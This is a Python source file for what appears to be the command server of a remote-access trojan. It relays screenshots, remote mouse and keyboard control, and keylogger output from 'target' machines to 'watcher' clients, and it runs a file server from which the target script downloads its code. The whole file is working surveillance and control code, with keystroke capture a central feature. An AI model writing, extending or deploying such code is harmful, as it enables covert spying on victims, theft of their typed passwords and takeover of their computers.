from Base.constants import ImageSendModes, Reasons, Actions, \
    ClientTypes, Status
from Base.settings import SERVER_PORT, SERVER_ADDRESS, WEB_SERVER_ADDRESS, \
    WEB_SERVER_PORT, ACKNOWLEDGEMENT_ITERATION, ADDRESS_TYPE, \
    IMAGE_SEND_MODE
from Base.socket_base import Socket as BaseSocket
from dataclasses import dataclass
import errno
from http.server import SimpleHTTPRequestHandler
from io import BytesIO
import json
from queue import Queue
import logging
from PIL import Image, ImageChops, UnidentifiedImageError
from random import random
from socket import socket, SO_REUSEADDR, SOL_SOCKET
from socketserver import TCPServer
from threading import Lock, Thread
from time import sleep, time
from typing import Dict


pil_logger = logging.getLogger("PIL")
pil_logger.setLevel(logging.INFO)


class Socket(BaseSocket):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.code: str = ""
        self.watchers = 0
        self.marked_for_stop = False
        self.ready = False


class Server(BaseSocket):
    """
    TODO: use a thread lock while incrementing or decrementing
        the `target.watchers` property
    """

    def __init__(self):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.running = False

        self.targets: Dict[str, Client] = {}

        # mapping for target and mouse events
        self.control_events: Dict[str, Queue[bytes]] = {}

        # access codes and sockets of all watchers
        self.watchers: Dict[str, Client] = {}

        self.file_server_running = False
        self.file_server = None

    def start(self):
        """
            Start the server.
        """
        self.running = True

        # make the address reusable
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            self.socket.bind(self.addr)
        except OSError as e:
            if e.errno == errno.EADDRINUSE:
                logging.fatal(f"Address {self.addr} already in use")
                return
        self.socket.listen()
        if not self.file_server_running:
            Thread(target=self.start_file_server, args=("/srv/fileShare",)
                   ).start()
        self.run()

    def run(self):
        """
            Accept for connections and create a thread for each client.
        """
        try:
            while self.running:
                logging.info("Accepting connection")
                client_socket, addr = self.socket.accept()
                logging.info(f"{addr} connected")
                Thread(target=self.handle_client,
                       args=(client_socket,)).start()
        except KeyboardInterrupt:
            logging.info("Stopping Server")
            self.stop()

    def handle_client(self, client_socket: socket):
        """
            Gets client types and calls respective functions
        """
        client = Socket(SERVER_ADDRESS, SERVER_PORT, client_socket)
        try:
            client_t = client.recv_data()
        except (BrokenPipeError, ConnectionResetError):
            logging.info("Client disconnected...")
            return

        # get the client type and run the respective function
        if client_t == ClientTypes.TARGET:
            self.handle_main_target_client(client)
        elif client_t == ClientTypes.TARGET_SCREEN_READER:
            self.handle_target_screen_reader_client(client)
        elif client_t == ClientTypes.TARGET_CONTROLLER:
            self.handle_target_controller_client(client)
        elif client_t == ClientTypes.TARGET_KEYLOGGER:
            self.handle_target_keylogger_client(client)
        elif client_t == ClientTypes.WATCHER:
            self.handle_main_watcher_client(client)
        elif client_t == ClientTypes.WATCHER_SCREEN_READER:
            self.handle_watcher_screen_reader_client(client)
        elif client_t == ClientTypes.WATCHER_CONTROLLER:
            self.handle_watcher_controller_client(client)
        elif client_t == ClientTypes.WATCHER_KEYLOGGER:
            self.handle_watcher_keylogger_client(client)
        elif client_t == b"":
            logging.info("Client sent no client type.. disconnecting")
            client.socket.close()
            return
        else:
            raise Exception(f"{client_t} is not a valid client type")

    def handle_main_target_client(self, client: Socket):
        """
            The main target client connects, waits for a watcher to start
            watching, starts screen reader and controller and disconnects
            itself from the server. The screen reader and controller remain
            connected untill no. of watchers watching this target client is
            at least 1. After no watcher is watching, the screen reader and
            controller also disconnect and the main target client connects
            again and waits.
        """
        logging.info("Main Target client connected")
        try:
            code = client.recv_data().decode(self.FORMAT)
            identity = json.loads(client.recv_data().decode(self.FORMAT))
        except (ConnectionResetError, BrokenPipeError):
            logging.info(f"Main target client {code} disconnected")
            return

        # don't allow two target clients with same code to connect
        if code in self.targets:
            client.send_data(Reasons.ALREADY_CONNECTED)
            logging.info(f"Not allowing target {code} to connect "
                         "as it is already connected")
            client.socket.close()
            return
        client.code = code
        client.running = True
        # client.status = Status.TARGET_WAITING
        # self.main_targets[code] = client
        lock = Lock()
        target = Client(code, client, identity=identity, lock=lock)
        self.targets[code] = target
        try:
            client.send_data(b"OK")
            while client.running and self.running:
                with lock:
                    client.send_data(Actions.WAIT)
                sleep(1)

        except (ConnectionResetError, BrokenPipeError):
            logging.info(f"Removing main target client {code}")

        finally:
            target.main = None

            # wait for others to disconnect
            while target.screen_reader or target.controller or \
                    target.keylogger:
                # logging.debug("Waiting for others to disconnect")
                sleep(.1)
            try:
                client.send_data(Actions.DISCONNECT)
            except (ConnectionResetError, BrokenPipeError):
                pass
            client.socket.close()
            del self.targets[code]
            logging.info(f"Main target client {code} disconnected")

    def accept_target_component(self, target: Socket, component: str):
        """
            Get the target code from the target component and check if
            it is connected. If it is already connected, don't allow
            the component to connect.
        """
        try:
            code = target.recv_data().decode(self.FORMAT)
            if code not in self.targets:
                logging.info(f"Not allowing {component} to connect as "
                             f"Main target client {code} is not connected")
                target.send_data(Reasons.MAIN_NOT_CONNECTED)
                target.socket.close()
                return
            if getattr(self.targets[code], component) is not None:
                logging.info(f"Not allowing {component} {code} "
                             "to connect as it is already connected")
                target.send_data(Reasons.ALREADY_CONNECTED)
                target.socket.close()
                return
            target.send_data(b"OK")
        except (BrokenPipeError, ConnectionResetError):
            return

        logging.info(f"target {component} client connected")
        return code

    def handle_target_screen_reader_client(self, target: Socket):
        """
            The `target` object has img object which is set to the image
            received from the target client.
        """
        code = self.accept_target_component(target, "screen_reader")
        if code is None:
            return

        target.img = b""
        target.ready = False
        self.targets[code].screen_reader = target
        running = True
        i = 0
        prev_img = None

        # while server is running and the target is connected and running
        try:
            while running and self.running:
                if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
                    target.img = target.recv_data()
                elif IMAGE_SEND_MODE == ImageSendModes.DIFF:
                    t1 = time()
                    diff = target.recv_data()
                    t2 = time()
                    bio = BytesIO(diff)

                    diff = Image.open(bio)
                    t3 = time()
                    if prev_img is None:
                        img = diff
                    else:
                        img = ImageChops.subtract_modulo(prev_img, diff)
                    t4 = time()
                    prev_img = img
                    bio = BytesIO(b"")
                    img.save(bio, format="JPEG")
                    target.img = bio.getvalue()

                    t5 = time()
                    logging.debug(f"{t2-t1}, {t3-t2}, {t4-t3}, {t5-t4}, {i}")

                target.validity = random()
                target.ready = True
                i += 1
                if i == ACKNOWLEDGEMENT_ITERATION:
                    target.send_data(b"OK")
                    i = 0
                running = self.targets[code].main is not None and not \
                    target.marked_for_stop

        except (BrokenPipeError, ConnectionResetError, KeyError,
                UnidentifiedImageError):
            # client disconnected
            logging.info(f"Removing target screen reader client {code}")

        finally:
            target.socket.close()
            self.targets[code].screen_reader = None
            logging.info(f"Target screen reader client {code} disconnected")

    def handle_target_controller_client(self, target: Socket):
        """
            Create a queue for each controller for this target.
            The watcher contoller will populate the queue.
            Fetch the control values from queue and send to target.
        """
        code = self.accept_target_component(target, "controller")
        if code is None:
            return

        self.targets[code].controller = target
        self.control_events[code] = Queue(0)

        running = True
        try:
            while running and self.running:
                # handle control events
                if not self.control_events[code].empty():
                    target.send_data(self.control_events[code].get())
                running = self.targets[code].main is not None and \
                    not target.marked_for_stop
                sleep(0.001)
        except (BrokenPipeError, ConnectionResetError):
            logging.info(f"Connection to target controller client {code} "
                         "failed unexpectedly. Removing it.")

        finally:
            target.socket.close()
            self.targets[code].controller = None
            logging.info(f"Target controller client {code} disconnected")

    def handle_target_keylogger_client(self, target: Socket):
        """
            Get the logged keys from the target. Wait till they are fetched
            by watcher and then get the next keys.

            TODO: This supports only one watcher at a time. Use a queue on
                  watcher client and populate each queue with received vks.
        """
        code = self.accept_target_component(target, "keylogger")
        if code is None:
            return

        target.ready = False
        self.targets[code].keylogger = target

        running = True
        try:
            while running and self.running:
                running = self.targets[code].main is not None and \
                          not target.marked_for_stop
                if target.ready:
                    sleep(0.1)
                    continue
                data = target.recv_data()
                if data == Actions.WAIT:
                    continue
                target.vks = data
                target.ready = True

        except (BrokenPipeError, ConnectionResetError):
            logging.info(f"Connection to target keylogger client {code} "
                         "failed unexpectedly. Removing it.")
        finally:
            target.socket.close()
            self.targets[code].keylogger = None
            logging.info(f"Target keylogger client {code} disconnected")

    def handle_main_watcher_client(self, watcher: Socket):
        """
            The main watcher client connects and sends requests
            that are to be served.
        """

        logging.info("Main Watcher client connected")

        try:
            code = watcher.recv_data().decode(self.FORMAT)
            if code in self.watchers:
                logging.info(f"Not allowing watcher {code} "
                             "to connect as it is already connected")
                watcher.send_data(Reasons.ALREADY_CONNECTED)
                watcher.socket.close()
                return False
            watcher.send_data(b"OK")
            # self.watchers[code] = watcher
        except (BrokenPipeError, ConnectionResetError):
            logging.info(f"Connection to Main Watcher {code} "
                         "failed unexpectedly. Removing it.")
            return

        lock = Lock()
        client = Client(code, watcher, lock=lock)
        self.watchers[code] = client

        try:
            while self.running:
                request = watcher.recv_data()
                if request == Actions.SEND_TARGET_LIST:
                    watcher.send_data(str(list(self.targets.keys()))
                                      .encode(self.FORMAT))

                elif request == Actions.DISCONNECT or request == b"":
                    break

                elif request == Actions.SEND_CONNECTED_COMPONENTS:
                    target_code = watcher.recv_data().decode(self.FORMAT)
                    if target_code in self.targets:
                        target = self.targets[target_code]
                        watcher.send_data(str([
                            target.main is not None,
                            target.screen_reader is not None,
                            target.controller is not None,
                            target.keylogger is not None
                        ]).encode(self.FORMAT))
                    else:
                        watcher.send_data(str([False]*4).encode(self.FORMAT))

                else:
                    raise Exception(f"Request '{request}' not defined!")
        except (BrokenPipeError, ConnectionResetError, OSError):
            logging.info(f"Connection to Main Watcher {code} "
                         "closed. Removing it.")
        finally:
            client.main = None
            watcher.socket.close()

            while client.controller or client.screen_reader or \
                    client.keylogger:
                sleep(.1)

            del self.watchers[code]
            logging.info(f"Main watcher client {code} disconnected")

    def accept_watcher_component(self, watcher: Socket, component: str):
        """
        Gets the watcher code and target code from the watcher component.
        Does not let the component connect if it is already connected.
        """
        try:
            code = watcher.recv_data().decode(self.FORMAT)
            if code not in self.watchers:
                logging.info(f"Not allowing {component} to connect as "
                             f"Main watcher client {code} is not connected")
                watcher.send_data(Reasons.MAIN_NOT_CONNECTED)
                watcher.socket.close()
                return
            if getattr(self.watchers[code], component) is not None:
                logging.info(f"Not allowing watcher {component} {code} "
                             "to connect as it is already connected")
                watcher.send_data(Reasons.ALREADY_CONNECTED)
                watcher.socket.close()
                return
            target_code = watcher.recv_data().decode(self.FORMAT)
            if target_code not in self.targets or \
                    self.targets[target_code].main is None:
                logging.info(f"The main target to be watched {code}"
                             " is not connected")
                return
            watcher.send_data(b"OK")
        except (BrokenPipeError, ConnectionResetError):
            logging.debug(f"Watcher {component} disconnected. "
                          "Removing it and stopping watching")
            return
        logging.info(f"Watcher {component} client connected")
        return code, target_code

    def handle_watcher_screen_reader_client(self, watcher: Socket):
        """
            Screen reader connects to the server and sends
            target images to the watcher.
        """

        codes = self.accept_watcher_component(watcher, "screen_reader")
        if codes is None:
            return

        code, target_code = codes

        # get the main target object
        target = self.targets[target_code].main
        with self.targets[target_code].lock:
            target.send_data(Actions.START_SCREEN_READER)

        # wait for the target screen to connect
        i = 0
        try:
            while self.targets[target_code].screen_reader is None:
                logging.debug("Waiting for target screen to connect")
                sleep(0.1)
                i += 1
                if i == 100:
                    logging.info(f"Target screen reader did not connect"
                                f" in a reasonable time. stopping {code} "
                                "screen reader")
                    watcher.socket.close()
                    self.watchers[code].screen_reader = None
                    logging.info(f"Watcher screen reader client {code} "
                                "disconnected")
                    return
        except KeyError:
            watcher.socket.close()
            self.watchers[code].screen_reader = None
            logging.info(f"Watcher screen reader client {code} disconnected")
            return
        target_screen = self.targets[target_code].screen_reader
        target_screen.watchers += 1
        self.watchers[code].screen_reader = watcher

        while not target_screen.ready:
            sleep(0.1)
        running = True
        i = 0
        last_validity = -1
        try:
            while running and self.running:
                running = self.watchers[code].main is not None and \
                    target_code in self.targets and \
                    self.targets[target_code].screen_reader is not None
                validity = target_screen.validity
                if last_validity == validity:
                    sleep(0.01)
                    continue
                last_validity = validity
                watcher.send_data(target_screen.img)
                i += 1
                if i == ACKNOWLEDGEMENT_ITERATION:
                    watcher.recv_data()  # receive acknowledgement
                    i = 0
                sleep(0.01)
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            if target_code in self.targets:
                with self.targets[target_code].lock:
                    target_screen.watchers -= 1
                    if target_screen.watchers == 0:
                        target_screen.marked_for_stop = True
            watcher.socket.close()
            self.watchers[code].screen_reader = None
            logging.info(f"Watcher screen reader client {code} disconnected")

    def handle_watcher_controller_client(self, watcher: Socket):
        """
            Gets the controller request for the given watcher and forwards
            it to the `handle_watcher_controllers` method.

            TODO: When target controller is disconnected, this method does not
                  return until there is one extra event from the watcher.
                  Sol: Keep receiving `Actions.WAIT`. But this may make
                  controlling slow.
        """

        codes = self.accept_watcher_component(watcher, "controller")
        if codes is None:
            return

        code, target_code = codes

        # get the main target object
        target = self.targets[target_code].main
        with self.targets[target_code].lock:
            target.send_data(Actions.START_CONTROLLER)

        try:
            while self.targets[target_code].controller is None:
                sleep(0.1)
        except KeyError:
            watcher.socket.close()
            self.watchers[code].controller = None
            logging.info(f"Watcher controller client {code} disconnected")
            return

        target_controller = self.targets[target_code].controller
        target_controller.watchers += 1
        self.watchers[code].controller = watcher

        running = True
        try:
            while running and self.running:
                if target_code not in self.targets or \
                        self.targets[target_code].controller is None:
                    break
                running = self.watchers[code].main is not None
                event = watcher.recv_data()
                if event == Actions.DISCONNECT:
                    break
                if event == Actions.WAIT:
                    continue
                if target_code in self.control_events:
                    self.control_events[target_code].put(event)
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            if target_code in self.targets:
                with self.targets[target_code].lock:
                    target_controller.watchers -= 1
                    if target_controller.watchers == 0:
                        target_controller.marked_for_stop = True
            watcher.socket.close()
            self.watchers[code].controller = None
            logging.info(f"Watcher controller client {code} disconnected")

    def handle_watcher_keylogger_client(self, watcher: Socket):
        """
        Sends target keystrokes to the watcher
        """

        codes = self.accept_watcher_component(watcher, "keylogger")
        if codes is None:
            return

        code, target_code = codes

        # get the main target object
        target = self.targets[target_code].main
        with self.targets[target_code].lock:
            target.send_data(Actions.START_KEYLOGGER)

        try:
            while self.targets[target_code].keylogger is None:
                sleep(0.1)
        except KeyError:
            watcher.socket.close()
            self.watchers[code].controller = None
            logging.info(f"Watcher keylogger client {code} disconnected")
            return

        logging.debug("Watcher keylogger connected")
        target_keylogger = self.targets[target_code].keylogger
        target_keylogger.watchers += 1
        self.watchers[code].keylogger = watcher

        running = True
        try:
            while running and self.running:
                if target_code not in self.targets or \
                        self.targets[target_code].keylogger is None:
                    break

                running = self.watchers[code].main is not None
                if not target_keylogger.ready:
                    sleep(0.1)
                    continue

                vks = target_keylogger.vks
                target_keylogger.ready = False
                watcher.send_data(vks)
        except (BrokenPipeError, ConnectionResetError):
            pass

        finally:
            if target_code in self.targets:
                with self.targets[target_code].lock:
                    target_keylogger.watchers -= 1
                    if target_keylogger.watchers == 0:
                        target_keylogger.marked_for_stop = True
            watcher.socket.close()
            self.watchers[code].keylogger = None
            logging.info(f"Watcher keylogger client {code} disconnected")

    def start_file_server(self, path):
        """
            Starts the file server that the target script will
            use to download the main code and the dependencies.
        """
        def Handler(*args, **kwargs):
            SimpleHTTPRequestHandler(*args, directory=path, **kwargs)

        with CustomTCPServer((WEB_SERVER_ADDRESS, WEB_SERVER_PORT),
                             Handler) as server:
            self.file_server_running = True
            self.file_server = server
            server.allow_reuse_address = True
            logging.info(f"Starting file server at {WEB_SERVER_ADDRESS}:"
                         f"{WEB_SERVER_PORT}")
            server.serve_forever()
        self.file_server_running = False
        logging.debug("Stopped file server")

    def stop(self):
        if self.file_server_running:
            self.file_server.shutdown()
        self.running = False
        self.socket.close()


@dataclass
class Client(object):
    code: str = None
    main: Socket = None
    screen_reader: Socket = None
    keylogger: Socket = None
    controller: Socket = None
    identity: Dict[int, bytes] = None
    lock: Lock = None


class CustomTCPServer(TCPServer):
    address_family = ADDRESS_TYPE


if __name__ == "__main__":
    server = Server()
    try:
        server.start()
    except KeyboardInterrupt:
        pass
    server.stop()

    logging.info("Server stopped")
